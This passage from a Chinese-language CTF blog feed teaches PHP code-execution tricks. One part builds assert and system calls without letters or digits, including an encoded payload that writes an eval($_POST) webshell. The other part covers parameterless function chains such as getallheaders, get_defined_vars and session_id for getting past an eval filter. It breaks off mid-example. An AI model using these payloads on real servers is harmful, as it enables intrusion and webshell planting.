class="line">%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20&#x27;_&#x27;%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/yormF8QcDX6BJMC.png" alt="image.png"></p><h2 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增 ++"></a>3.自增 ++</h2><p>我们先看看php语言自增、自减的规则：<a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p><p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><p><img src="https://i.loli.net/2021/07/28/4HgcwPoizFrmWxn.png" alt="image.png"></p><p>这里我就直接给出p神的构造结果了，构造出来很长，而且我感觉也不是特别实用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>放到一排再url编码之后是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure><p>说实话真的太长了，要是稍微有个长度限制就用不了，所以说这种方法只做了解即可</p><h2 id="php5和php7的区别"><a href="#php5和php7的区别" class="headerlink" title="php5和php7的区别"></a>php5和php7的区别</h2><p>在研究无数字字母rce的过程中，一个很重要的函数就是<code>assert</code>，但在php5的版本和php7的版本中，它是有一些区别的，我们上面的测试都是基于php5进行的，在php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码，在php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，但是在php7中，我们可以使用($a)()这种方法来执行命令，那相当于我们对phpinfo取反后就可以直接执行了，也可以选择file_put_contents()来写入shell，在php5中这样是不行的：</p><p><img src="https://i.loli.net/2021/07/28/Qg5qLsabUhoZMj2.png" alt="image.png"></p><h3 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h3><p>在php7中，因为可以使用($a)()这种方法来执行命令，所以说我们利用<code>call_user_func()</code>来举例，<code>(call_user_func)(system,whoami,&#39;&#39;)</code>即可执行<code>whoami</code>的命令：</p><p><img src="https://i.loli.net/2021/07/28/MJiaehA9p1HUrKD.png" alt="image.png"></p><p>那构造出来的结果就为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);</span><br></pre></td></tr></table></figure><h3 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h3><p>再来一个在php7中利用<code>file_put_contents()</code>写入<code>shell</code>的例子：</p><p><img src="https://i.loli.net/2021/07/28/ZLgrdRDoOp1Kjsv.png" alt="image.png"></p><p>我们要构造的语句为：<code>file_put_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code>构造出来就为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));</span><br></pre></td></tr></table></figure><p>这里要注意的就是要有该目录的写入权限哈</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/8107">https://xz.aliyun.com/t/8107</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/112898103?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_46330722/article/details/112898103?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;无数字字母rce&quot;&gt;&lt;a href=&quot;#无数字字母rce&quot; class=&quot;headerlink&quot; title=&quot;无数字字母rce&quot;&gt;&lt;/a&gt;无数字字母rce&lt;/h1&gt;&lt;p&gt;无数字字母rce，这是一个老生常谈的问题了，就是不利用数字和字母构造出&lt;code&gt;webshell&lt;/code&gt;，从而能够执行我们的命令，之前一直没有系统总结过，今天来好好总结总结，这里主要是总结异或和取反两种方法，这两种方法是目前来看最实用的两种方法，还有一种自增的方法稍微介绍一下就好&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="https://arsenetang.github.io/tags/RCE/"/>
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE篇之无参数rce</title>
    <link href="https://arsenetang.github.io/2021/07/26/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%8F%82%E6%95%B0rce/"/>
    <id>https://arsenetang.github.io/2021/07/26/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%8F%82%E6%95%B0rce/</id>
    <published>2021-07-25T16:00:00.000Z</published>
    <updated>2021-08-09T14:13:46.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p><span id="more"></span><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/GMZb7DrRScECIlN.png" alt="image.png"></p><p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/Lz9jT6SYD3NHb8y.png" alt="image.png"></p><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p><p><img src="https://i.loli.net/2021/07/26/BQ6T5OrMGfjlZgN.png" alt="image.png"></p><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p><p><img src="https://i.loli.net/2021/07/26/4FqvBfXaAeyNC3g.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/3ZBCwRhXz2ak7YM.png" alt="image.png"></p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p><img src="https://i.loli.net/2021/07/26/13JpeDs8nRGUczk.png" alt="image.png"></p><p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><p><img src="https://i.loli.net/2021/07/26/PxMQULHXu9aiYzs.png" alt="image.png"></p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://i.loli.net/2021/07/26/Sqhg1Zj8HNx5wUW.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/smIJOtgU6pKfZkQ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/6gGDNvxdCILqe2y.png" alt="image.png"></p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p><p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p><p><img src="https://i.loli.net/2021/07/26/IoHD3R28sYNXvez.png" alt="image.png"></p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p><p><img src="https://i.loli.net/2021/07/26/MSZjiERGkQodUlf.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/GeOmatAkENCJwKi.png" alt="image.png"></p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p><p><img src="https://i.loli.net/2021/07/26/ani19egmLZcu2vH.png" alt="image.png"></p><p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p><h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作，   接下来我们就来介绍这些函数：</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p><p><img src="https://i.loli.net/2021/07/26/G1zOWvBrR3CgXmy.png" alt="image.png"></p><p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p><p><img src="https://i.loli.net/2021/07/26/sfonwIYeMTOi3KC.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/Yqci9fpVy3H6Pm2.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/26/S1cTe9vuVXbZUgp.png" alt="image.png"></p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p><p><img src="https://i.loli.net/2021/07/26/5waJdTMjDNoL4HW.png" alt="image.png"></p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p><p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p><p><img src="https://i.loli.net/2021/07/26/TMYrPC3gjWAUN8K.png" alt="image.png"></p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir(&#39;..&#39;)</code></p><p><img src="https://i.loli.net/2021/07/26/EbcgjxLkBCWNZvR.png" alt="image.png"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="例题解析——–GXYCTF-2019禁止套娃"><a href="#例题解析——–GXYCTF-2019禁止套娃" class="headerlink" title="例题解析——–GXYCTF 2019禁止套娃"></a>例题解析——–GXYCTF 2019禁止套娃</h2><p>这道题首先是一个git源码泄露，我们先用<code>GitHack</code>把源码跑下来，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span 